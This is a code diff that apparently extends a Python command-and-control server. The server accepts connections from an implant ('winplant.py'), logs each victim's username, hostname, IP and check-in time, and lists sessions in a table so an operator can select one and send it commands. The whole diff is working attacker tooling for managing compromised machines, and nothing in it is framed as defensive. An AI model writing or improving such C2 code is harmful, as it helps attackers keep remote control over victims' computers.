@@ -1,6 +1,9 @@
 import socket
 import sys
 import threading
+import time
+from datetime import datetime
+from prettytable import PrettyTable
 
 def banner():
     '''banner'''
@@ -18,8 +21,18 @@ def comm_handler():
             break
         try:
             remote_target, remote_ip = sock.accept()
-            targets.append([remote_target, remote_ip[0]])
-            print(f"\n[+] Connection received from {remote_ip[0]}\n + Enter command#> ", end="")
+            # receive username from winplant.py
+            username = remote_target.recv(1024).decode()
+            cur_time = time.strftime("%H:%M:%S", time.localtime())
+            date = datetime.now()
+            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
+            host_name = socket.gethostbyaddr(remote_ip[0])
+            if host_name is not None:
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username])
+                print(f"\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n + Enter command#> ", end="")
+            else:
+                targets.append([remote_target, remote_ip[0], time_record])
+                print(f"\n[+] Connection received from {remote_ip[0]}\n + Enter command#> ", end="")
         except:
             pass
 
@@ -85,10 +98,13 @@ if __name__ == "__main__":
             if command.split(" ")[0] == "sessions":
                 session_counter = 0
                 if command.split(" ")[1] == "-l":
-                    print("Session" + " "*10 + "Target")
+                    myTable = PrettyTable()
+                    myTable.field_names = ["Session", "Status", "Username", "Target", "Check-In Time"]
+                    myTable.padding_width = 3
                     for target in targets:
-                        print(str(session_counter) + " "*16 + target[1])
+                        myTable.add_row([session_counter, "Placeholder", target[3], target[1], target[2]])
                         session_counter += 1
+                    print(myTable)
                 if command.split(" ")[1] == "-i":
                     num = int(command.split(" ")[2])
                     targ_id = (targets[num])[0]
